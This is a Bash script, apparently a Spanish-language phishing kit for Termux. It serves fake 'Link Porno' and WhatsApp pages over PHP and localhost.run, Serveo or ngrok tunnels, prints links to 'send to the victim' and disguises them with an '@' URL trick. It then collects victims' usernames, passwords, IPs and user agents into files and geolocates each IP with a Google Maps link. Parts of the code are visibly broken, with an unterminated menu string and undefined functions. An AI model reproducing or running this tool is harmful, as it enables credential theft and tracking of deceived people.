#!/bin/bash
trap 'printf "\n";stop;exit 1' 2
packages() {
command -v php > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing PHP..."; pkg install php -y;}
command -v curl > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing curl..."; pkg install curl -y;}
command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing git..."; pkg install git -y;}
}

stop() {
checkng=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkng == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
}



menu(){
packages
echo -e $bcolor
$banner
echo
echo -e "$a[$b 1$v ]$b Link Porno         $a[$b 2$v ]$b WhatsApp
}
finish() {
       
	if [[ -f ngrok ]];then
	if [[ -d $ruta_carpeta/images ]];then
        rm -rf $ruta_carpeta/images
        fi
        if [[ -f $ruta_carpeta/alert.js ]];then
        rm -rf $ruta_carpeta/alert.js
        fi
        if [[ -f $ruta_carpeta/email ]];then
        rm $ruta_carpeta/email
        fi
	if [[ -f $ruta_carpeta/pr1 ]];then
	rm $ruta_carpeta/pr1
	fi
	if [[ -f $ruta_carpeta/pr2 ]];then
        rm $ruta_carpeta/pr2
        fi
	if [[ -f $ruta_carpeta/pr3 ]];then
        rm $ruta_carpeta/pr3
        fi
	if [[ -f $ruta_carpeta/pr4 ]];then
        rm $ruta_carpeta/pr4
        fi
        if [[ -f $ruta_carpeta/hola ]];then
        rm $ruta_carpeta/hola
        fi
        if [[ -f $ruta_carpeta/victima ]];then
        rm $ruta_carpeta/victima
        fi
	sed -i "/<meta property='og:.*' content='.*'/d" ./$ruta_carpeta/index.html
        sed -i "/<script src='alert.js'/d" ./$ruta_carpeta/index.html
	else
	if [[ -d images ]];then
        rm -rf images
        fi
        if [[ -f alert.js ]];then
        rm -rf alert.js
        fi
        if [[ -f email ]];then
        rm email
        fi
        if [[ -f hola ]];then
        rm hola
        fi
	if [[ -f pr1 ]];then
	rm pr1
	fi
	if [[ -f pr2 ]];then
        rm pr2
        fi
	if [[ -f pr3 ]];then
        rm pr3
        fi
	if [[ -f pr4 ]];then
        rm pr4
        fi
        if [[ -f victima ]];then
        rm victima
        fi
        sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
        sed -i "/<script src='alert.js'/d" ./index.html
	fi
}

options(){
menu
echo
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;92m Elige una opción\e[1;39m > ' opc
echo
if [[ $opc == "1" || $opc == "01" ]];then
web="Enlace Porno"
go



elif [[ $opc == "40" ]];then
web="WhatsApp"
op="ingles"
ruta_carpeta="websites/$web"
tunnel



sleep 0.5
exit

else
echo -e "$r [!]$b Opción invalida, $opc"
sleep 0.5
options
fi
}

findngrok(){
if [[ -f ngrok ]];then
jajaj="g"
else
command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando git..."; pkg install git -y;}
ar=$(uname -a | grep -o 'arm' | head -n1)
ar2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $ar == *'arm'* ]] || [[ $ar2 == *'Android'* ]] ; then
echo -e "$v[*]$b Instalando ngrok..."
git clone https://github.com/HarrisSec/best-ngrok
cd best-ngrok
mv ngrok $OLDPWD
cd $OLDPWD
if [[ -d best-ngrok ]];then
rm -rf best-ngrok
else
echo -e "$r[!]$b Comprueba tu conexión."
exit 1
fi

else
echo -e "$v[*]$b Instalando ngrok..."
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
echo -e "$r[!]$b Comprueba tu conexión."
exit 1
fi

fi

fi

}

tunnel(){
clear
echo -e $bcolor
$banner
echo -e "$v[$b*$v] Pagina:$b $web"
echo -e "$v[$b*$v] Idioma:$b $op"
echo -e "$v[$b*$v]$b Selecciona el tunnel:\n"
echo -e "$a[$b 1$v ] Localhost.run"
echo -e "$a[$b 2$v ] Serveo"
echo -e "$a[$b 3$v ] Ngrok\n"
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' tunnel
if [[ $tunnel == "1" || $tunnel == "01" ]];then
cd $ruta_carpeta
tunnel2="localrun"
trap finish EXIT
clear_meta
menu_options
add_option

elif [[ $tunnel == "2" || $tunnel == "02" ]];then
cd $ruta_carpeta
tunnel2="serveo"
trap finish EXIT
clear_meta
menu_options
add_option

elif [[ $tunnel == "3" || $tunnel == "03" ]];then
cd $ruta_carpeta
tunnel2="ngrok"
trap finish EXIT
clear_meta
menu_options
add_option
else
echo
echo -e "\e[1;91m[*]\e[1;39m Opción invalida: $tunnel"
echo
sleep 0.5
tunnel
fi
}



##server
localrun(){
command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
echo
port=3333
echo
php -S localhost:$port > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Enpezando..."
sleep 2
if [[ -f run ]];then
rm run
fi
$(which sh) -c 'ssh -R 80:localhost:$port ssh.localhost.run 2> /dev/null > run ' &
echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
sleep 5
echo -e "$v[$b*$v]$b Abriendo local.run..."
sleep 5
echo -e "$v[$b*$v]$b Obteniendo links..."
sleep 5
envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b localhost:3333"
echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
cutt
check
if [[ $add7 == "7" ]];then
echo -e "$v[$b*$v]$b Enviando email..."
fi
check_found
fi
if [[ -f run ]]; then
rm run
fi
}


serveo(){
command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
echo
port=3333
echo
php -S localhost:$port > /dev/null 2>&1 & 
echo -e "$v[$b*$v]$b Enpezando..."
sleep 2
if [[ -f link ]]; then
rm -rf link
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > link ' &
echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
sleep 5
echo -e "$v[$b*$v]$b Abriendo serveo..."
sleep 5
echo -e "$v[$b*$v]$b Obteniendo links..."
sleep 5
envialink=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b localhost:3333"
echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
cutt
if [[ $add7 == "7" ]];then
echo -e "$v[$b*$v]$b Enviando email..."
fi
check
check_found
fi
if [[ -f link ]]; then
rm -rf link
fi
}

ngrok(){
echo
php -S $link > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Enpezando..."
sleep 2
cd $OLDPWD
findngrok
./ngrok http $link > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Verifica una buena conexión de internet"
sleep 5
echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
sleep 7
echo -e "$v[$b*$v]$b Abriendo ngrok..."
sleep 7
echo -e "$v[$b*$v]$b Obteniendo links..."
sleep 7
envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b $link"
echo -e "$v[$b*$v]$b Envia a la victima > \e[0;32m$envialink"
cd $ruta_carpeta
cutt
if [[ $add7 == "7" ]];then
echo -e "$v[$b*$v]$b Enviando email..."
fi
check
check_found
fi
}

cutt(){
namee=$(echo "$envialink" | cut -d "/" -f3)
pop9="https://www.$web.com@$namee"
echo -e "$v[$b*$v]$b Envio por facebook\e[0;32m " $pop9
}


check_found(){
echo -e "\n$r[$b*$r]$b Esperando Datos$r [$b*$r]"
echo -e $v
while true;do
if [[ -f foundip.txt ]];then
sed -i '3iIP Encontrada: '"$HORA"' '"$DIA"'' foundip.txt
echo
echo -e "$v[*]$a IP Encontrada!!"
found_ip
rm foundip.txt
sleep 0.5
fi

if [[ -f founduser.txt ]];then
sed -i '3iDatos Encontrados: '"$HORA"' '"$DIA"'' founduser.txt
echo -e "$v[*]$a Datos Encontrados!!"
found_user
rm founduser.txt
fi
sleep 0.5
done

}

found_ip(){
ip=$(grep -a 'IP:' foundip.txt | cut -d " " -f2 | tr -d '\r')
agent=$(grep 'User-Agent:.*' foundip.txt | cut -d ':' -f2)
saved_to="\e[1;33mIP Guardada:$b $ruta_carpeta/ip.txt"
echo -e "$a[*]$v IP:$b " $ip
echo
echo -e  "$a[*]$v User-Agent:$b"$agent
echo
echo -e $saved_to
cat foundip.txt >> ip.txt
echo
dates_ip
echo
echo -e "$v[$b*$v]$b Esperando proximos datos$v [$b*$v]"
echo
}

found_user(){
account=$(grep -o 'Username:.*' founduser.txt | cut -d " " -f2)
password=$(grep -o 'Password:.*' founduser.txt | cut -d ":" -f2)
saved_to="\e[1;33mDatos Guardados:$b $ruta_carpeta/account.txt"
echo -e "$a[*]$v Usuario:$b" $account
echo -e "$a[*]$v Contraseña:$b" $password
echo
echo -e $saved_to
cat founduser.txt >> account.txt
echo
echo -e "$v[$b*$v]$b Esperando proximos datos$v [$b*$v]"
echo
}


dates_ip(){
if [[ -f infoip ]];then
rm infoip
fi

ipfind=$(curl -s -L "http://ip-api.com/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > infoip)
query=$(grep -o '"query":.*' infoip | cut -d '"' -f4)

if [[ $query == "" ]]; then
echo -e "$v[*] Hostname:$b Unknown"
else
echo -e "$v[*] Hostname:$b" $query
fi

country=$(grep -o '"country":.*' infoip | cut -d '"' -f4)

if [[ $country == "" ]]; then

echo -e "$v[*] Country:$b Unknown"
else
echo -e "$v[*] Country:$b" $country
fi

cc=$(grep -o '"countryCode":.*' infoip | cut -d '"' -f4)

if [[ $cc == "" ]];then
echo -e "$v[*] Country Code:$b Unknown"
else
echo -e "$v[*] Country Code:$b" $cc
fi


rn=$(grep -o '"regionName":.*' infoip | cut -d '"' -f4)
if [[ $rn == "" ]];then
echo -e "$v[*] Region:$b Unknown"

else
echo -e "$v[*] Region:$b" $rn
fi

city=$(grep -o '"city":.*' infoip | cut -d '"' -f4)
if [[ $city == "" ]];then
echo -e "$v[*] City:b Unknown"
else
echo -e "$v[*] City:$b" $city
fi

zip=$(grep -o '"zip":.*' infoip | cut -d '"' -f4)
if [[ $zip == "" ]];then
echo -e "$v[*] zip:$b Unknown"
else
echo -e "$v[*] zip:$b" $zip
fi

tz=$(grep -o '"timezone":.*' infoip | cut -d '"' -f4)
if [[ $tz == "" ]];then
echo -e "$v[*] Time Zone:$b Unknown"
else
echo -e "$v[*] Time Zone:$b" $tz
fi

isp=$(grep -o '"isp".*' infoip | cut -d '"' -f4)
if [[ $isp == "" ]];then

echo -e "$v[*] ISP:$b Unknown"
else
echo -e "$v[*] ISP:$b" $isp
fi

org=$(grep -o '"org":.*' infoip | cut -d '"' -f4)
if [[ $org == "" ]];then
echo -e "$v[*] org:$b Unknown"
else
echo -e "$v[*] org:$b" $org
fi

as=$(grep -o '"as":.*' infoip | cut -d '"' -f4)
if [[ $as == "" ]];then
echo -e "$v[*] AS:$b Unknown"
else
echo -e "$v[*] AS:$b" $as
fi

lan=$(grep -o '"lat":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
lon=$(grep -o '"lon":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)

if [[ $lan == "" || $lon == "" ]];then
echo -e "$v[*] Google Maps:$b Unknown"
else
link_maps="https://www.google.com/maps/place/$lan,$lon"
echo -e "$v[*] Google Maps:$b" $link_maps

rm infoip
fi
}


options
